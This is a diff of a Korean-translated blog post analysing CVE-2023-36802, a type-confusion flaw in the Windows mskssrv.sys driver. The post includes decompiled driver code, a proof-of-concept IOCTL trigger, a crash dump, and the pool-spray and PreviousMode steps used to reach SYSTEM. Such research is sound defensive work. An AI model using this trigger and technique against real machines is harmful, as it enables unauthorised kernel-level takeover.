@@ -3,13 +3,12 @@ title: "N일 연속하여 모든 것을 탈취하는 방법 파트 6 - Windows �
 description: ""
 coverImage: "/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png"
 date: 2024-05-23 15:21
-ogImage: 
+ogImage:
   url: /assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png
 tag: Tech
 originalTitle: "Chaining N-days to Compromise All: Part 6 — Windows Kernel LPE: Get SYSTEM"
 link: "https://medium.com/@vr-blog/chaining-n-days-to-compromise-all-part-6-windows-kernel-lpe-get-system-83cd756ce90a"
 ---
-
 
 ![이미지](/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_0.png)
 
@@ -19,7 +18,18 @@ link: "https://medium.com/@vr-blog/chaining-n-days-to-compromise-all-part-6-wind
 
 # 세 번째 블로그를 상기해 보세요
 
-<div class="content-ad"></div>
+<!-- ui-station 사각형 -->
+
+<ins class="adsbygoogle"
+style="display:block"
+data-ad-client="ca-pub-4877378276818686"
+data-ad-slot="7249294152"
+data-ad-format="auto"
+data-full-width-responsive="true"></ins>
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 이 취약점의 대상 드라이버는 이 시리즈의 세 번째 블로그와 동일합니다. DeviceIoControl을 통한 통신 프로세스, Ioctl 요청 처리 과정 등과 같이 중복된 내용은 건너뜁니다. 따라서 이 블로그를 시작하기 전에 CVE-2023-29360이 포함된 세 번째 블로그를 읽는 걸 강력히 권장합니다.
 
@@ -46,7 +56,18 @@ __int64 __fastcall FSRendezvousServer::PublishTx(FSRendezvousServer *this, struc
 
 사용자가 제공한 값을 유효성 검사한 후, FSStreamReg::PublishTx가 FsContext2를 첫 번째 인수로 호출됩니다. 즉, FsContext2는 FSStreamReg와 관련된 유형의 개체로 추론할 수 있습니다.
 
-<div class="content-ad"></div>
+<!-- ui-station 사각형 -->
+
+<ins class="adsbygoogle"
+style="display:block"
+data-ad-client="ca-pub-4877378276818686"
+data-ad-slot="7249294152"
+data-ad-format="auto"
+data-full-width-responsive="true"></ins>
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 FsContext2 값을 FSStreamReg 개체로 설정하려면 FSRendezvousServer::InitializeStream을 호출해야하며, 이 작업은 IoControlCode가 0x2F0404 일 때에만 호출될 수 있습니다.
 
@@ -77,7 +98,18 @@ __int64 __fastcall FSRendezvousServer::InitializeStream(FSRendezvousServer *this
 
 위에서 언급한 대로, obj-`FileObject-`FsContext2가 FSStreamReg 유형으로 간주되고 있었습니다. 그러나 이 가정이 맞는 것일까요?
 
-<div class="content-ad"></div>
+<!-- ui-station 사각형 -->
+
+<ins class="adsbygoogle"
+style="display:block"
+data-ad-client="ca-pub-4877378276818686"
+data-ad-slot="7249294152"
+data-ad-format="auto"
+data-full-width-responsive="true"></ins>
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 FSRendezvousServer::FindObject 함수를 살펴보겠습니다. 이 함수는 FsContext2가 FSRendezvousServer 객체 내에 있는지 확인합니다.
 
@@ -86,7 +118,7 @@ char __fastcall FSRendezvousServer::FindObject(FSRendezvousServer *this, __int64
 {
   if ( FsContext2 )
   {
-    if ( *(_DWORD *)(FsContext2 + 0x30) == 1 ) 
+    if ( *(_DWORD *)(FsContext2 + 0x30) == 1 )
     {
       // Type number가 `1`인 경우
       ...
@@ -100,7 +132,7 @@ char __fastcall FSRendezvousServer::FindObject(FSRendezvousServer *this, __int64
         FSRegObjectList::MoveNext((FSRendezvousServer *)((char *)this + 0x70));
       }
     }
-    else 
+    else
     {
       // Type number가 `1`이 아닌 경우
       ...
@@ -134,7 +166,18 @@ __int64 __fastcall FSStreamReg::FSStreamReg(__int64 FSStreamReg)
 }
 ```
 
-<div class="content-ad"></div>
+<!-- ui-station 사각형 -->
+
+<ins class="adsbygoogle"
+style="display:block"
+data-ad-client="ca-pub-4877378276818686"
+data-ad-slot="7249294152"
+data-ad-format="auto"
+data-full-width-responsive="true"></ins>
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 mskssrv.sys 드라이버를 분석한 후, type number가 1인 FSContextReg 객체를 찾을 수 있었습니다.
 
@@ -162,7 +205,18 @@ FSContextReg의 크기로부터 (FSContextReg는 0x78바이트, FSStreamReg는 0
 
 타입 혼란이 발생하면 FSStreamReg::PublishTx는 두 객체 간에 상속 관계가 없더라도 FSContextReg 객체를 FSStreamReg 타입으로 처리할 것입니다.
 
-<div class="content-ad"></div>
+<!-- ui-station 사각형 -->
+
+<ins class="adsbygoogle"
+style="display:block"
+data-ad-client="ca-pub-4877378276818686"
+data-ad-slot="7249294152"
+data-ad-format="auto"
+data-full-width-responsive="true"></ins>
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 ```js
 __int64 __fastcall FSStreamReg::PublishTx(__int64 FsStreamReg, __int64 data)
@@ -228,7 +282,18 @@ __int64 __fastcall FSStreamReg::CheckRecycle(__int64 this, __int64 data)
 }
 ```
 
-<div class="content-ad"></div>
+<!-- ui-station 사각형 -->
+
+<ins class="adsbygoogle"
+style="display:block"
+data-ad-client="ca-pub-4877378276818686"
+data-ad-slot="7249294152"
+data-ad-format="auto"
+data-full-width-responsive="true"></ins>
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 FSRendezvousServer::FindObject의 이름이 FSRendezvousServer::FindStreamObject로 변경되었습니다. 이 함수는 타입 번호 2의 FSStreamReg 오브젝트를 탐색합니다.
 
@@ -253,7 +318,18 @@ __int64 __fastcall FSInitializeContextRendezvous(struct _IRP *a1)
 }
 ```
 
-<div class="content-ad"></div>
+<!-- ui-station 사각형 -->
+
+<ins class="adsbygoogle"
+style="display:block"
+data-ad-client="ca-pub-4877378276818686"
+data-ad-slot="7249294152"
+data-ad-format="auto"
+data-full-width-responsive="true"></ins>
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 그러면 취약한 함수 중 하나를 트리거하여 FSRendezvousServer::PublishTx(0x2F0408), FSRendezvousServer::PublishRx(0x2F040C), FSRendezvousServer::ConsumeTx(0x2F0410), FSRendezvousServer::ConsumeRx(0x2F0414)를 실행합니다.
 
@@ -275,10 +351,10 @@ int wmain(int argc, wchar_t** argv) {
     0x80,
     NULL
   );
-  
+
   PCHAR inputBuffer = (PCHAR)malloc(inputsize);
   PCHAR outputBuffer = (PCHAR)malloc(outputsize);
-  
+
   printf("[+] Initialize Rendezvous\n");
   memset(inputBuffer, 0, inputsize);
   *(DWORD*)(inputBuffer + 0x00) = 0xffffffff; // &1 == Non ZERO
@@ -286,11 +362,11 @@ int wmain(int argc, wchar_t** argv) {
   *(DWORD64*)(inputBuffer + 0x10) = 0x4343434344444444; // Some Marker
   *(DWORD64*)(inputBuffer + 0x18) = 0; // 0
   ntstatus = DeviceIoControl(hDevice, 0x2F0400, inputBuffer, inputsize, outputBuffer, outputsize, NULL, NULL); // FSInitializeContextRendezvous
-  
+
   printf("[+] Publish RX --> Trigger OOB Access Vulnerability\n");
   memset(inputBuffer, 0, inputsize);
   *(DWORD*)(inputBuffer + 0x20) = 1; // maxCnt
-  *(DWORD*)(inputBuffer + 0x24) = 1; // CNT <= maxCnt 
+  *(DWORD*)(inputBuffer + 0x24) = 1; // CNT <= maxCnt
   *(DWORD64*)(inputBuffer + 0x30) = 0; // Some Value
   ntstatus = DeviceIoControl(hDevice, 0x2F040C, inputBuffer, inputsize, outputBuffer, outputsize, NULL, NULL); // PublishRx
 }
@@ -298,7 +374,18 @@ int wmain(int argc, wchar_t** argv) {
 
 mskssrv.sys에서 verifier가 활성화되어 있는 경우 충돌이 발생할 수 있습니다.
 
-<div class="content-ad"></div>
+<!-- ui-station 사각형 -->
+
+<ins class="adsbygoogle"
+style="display:block"
+data-ad-client="ca-pub-4877378276818686"
+data-ad-slot="7249294152"
+data-ad-format="auto"
+data-full-width-responsive="true"></ins>
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 ```js
 1: kd> r
@@ -333,7 +420,7 @@ KDTARGET: Refreshing KD connection
 *** Fatal System Error: 0x00000050
                        (0xFFFFBF8B77207108,0x0000000000000000,0xFFFFF80FFAC9C9F7,0x0000000000000002)
 
-Driver at fault: 
+Driver at fault:
 ***   MSKSSRV.sys - Address FFFFF80FFAC9C9F7 base at FFFFF80FFAC90000, DateStamp 75a6d2bb
 .
 
@@ -350,9 +437,20 @@ r11=0000000000000010 r12=0000000000000003 r13=ffffbf8b77207108
 r14=000000
 ```
 
-<div class="content-ad"></div>
+<!-- ui-station 사각형 -->
 
-FSStreamReg::PublishRx 함수는 적절한 FrameMDL 객체를 찾기 위해 0x188과 0x198 Offset에 접근합니다. 0x188과 0x198 오프셋은 경종 영역(out-of-bound area)에 있으므로, 제어 가능한 값을 넣을 수 있습니다. 따라서 조건을 쉽게 만족시킬 수 있고 임의의 감소 코드를 실행할 수 있습니다([*]). ObfDereferenceObject 함수는 이 위치에 있는 객체의 참조 횟수를 감소시킬 것입니다. 
+<ins class="adsbygoogle"
+style="display:block"
+data-ad-client="ca-pub-4877378276818686"
+data-ad-slot="7249294152"
+data-ad-format="auto"
+data-full-width-responsive="true"></ins>
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+FSStreamReg::PublishRx 함수는 적절한 FrameMDL 객체를 찾기 위해 0x188과 0x198 Offset에 접근합니다. 0x188과 0x198 오프셋은 경종 영역(out-of-bound area)에 있으므로, 제어 가능한 값을 넣을 수 있습니다. 따라서 조건을 쉽게 만족시킬 수 있고 임의의 감소 코드를 실행할 수 있습니다([*]). ObfDereferenceObject 함수는 이 위치에 있는 객체의 참조 횟수를 감소시킬 것입니다.
 
 그러나 장애물이 있었습니다. FSContextReg 객체의 크기는 풀 헤더(0x10 바이트)를 포함해 0x90 바이트이므로, LFH (Low Fragmented Heap)를 사용할 것입니다. 이는 0x90 바이트를 할당하여 메모리 레이아웃을 생성해야 함을 의미합니다. 메모리 레이아웃을 만들기 위해 네임드 파이프 객체를 사용할 수 있습니다. 네임드 파이프 객체는 NonPagedPool을 위한 취약점을 이용하기 위해 널리 사용됩니다. 왜냐하면 FSContextReg는 NonPagedPool에 할당되기 때문입니다.
 
@@ -360,7 +458,18 @@ FSStreamReg::PublishRx 함수는 적절한 FrameMDL 객체를 찾기 위해 0x18
 
 ![이미지](/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_1.png)
 
-<div class="content-ad"></div>
+<!-- ui-station 사각형 -->
+
+<ins class="adsbygoogle"
+style="display:block"
+data-ad-client="ca-pub-4877378276818686"
+data-ad-slot="7249294152"
+data-ad-format="auto"
+data-full-width-responsive="true"></ins>
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 위 그림에서와 같이 사용자가 제어할 수 없는 네임드 파이프 개체의 헤더 영역에는 오프셋 0x1C8이 있습니다. 이 문제를 해결하기 위해 이 상황에 적합한 다른 적절한 개체를 찾아보았고, ThreadName 개체를 발견했습니다.
 
@@ -408,7 +517,18 @@ ThreadName은 ThreadNameInformation(0x26)을 사용하여 NtSetInformationThread
 
 <img src="/assets/img/2024-05-23-ChainingN-daystoCompromiseAllPart6WindowsKernelLPEGetSYSTEM_2.png" />
 
-<div class="content-ad"></div>
+<!-- ui-station 사각형 -->
+
+<ins class="adsbygoogle"
+style="display:block"
+data-ad-client="ca-pub-4877378276818686"
+data-ad-slot="7249294152"
+data-ad-format="auto"
+data-full-width-responsive="true"></ins>
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 이 객체를 사용하면 오프셋 0x188 및 0x1C8의 값을 완전히 처리하고 임의의 감소를 성공적으로 발생시킬 수 있습니다. 이 임의의 감소 기본 원리를 통해 현재 스레드 개체의 PreviousMode를 사용자(1)에서 커널(0)으로 변경할 수 있습니다. 여기서 커널 스레드 권한으로 권한 상승을 위한 잘 알려진 방법을 사용할 수 있습니다.
 
@@ -418,7 +538,18 @@ Fermium-252: 사이버 위협 인텔리전스 데이터베이스에는 PoC 및 �
 
 이 게시물에서는 우리의 1일 완전한 체인 익스플로잇의 마지막 시리즈인 CVE-2023-36802의 분석을 제공했습니다. 이 블로그 시리즈가 끝나더라도 우리는 항상 세계의 위협을 분석하고 다른 흥미로운 연구 주제의 다른 블로그 게시물로 돌아올 것입니다.
 
-<div class="content-ad"></div>
+<!-- ui-station 사각형 -->
+
+<ins class="adsbygoogle"
+style="display:block"
+data-ad-client="ca-pub-4877378276818686"
+data-ad-slot="7249294152"
+data-ad-format="auto"
+data-full-width-responsive="true"></ins>
+
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script>
 
 # 참고 자료
 
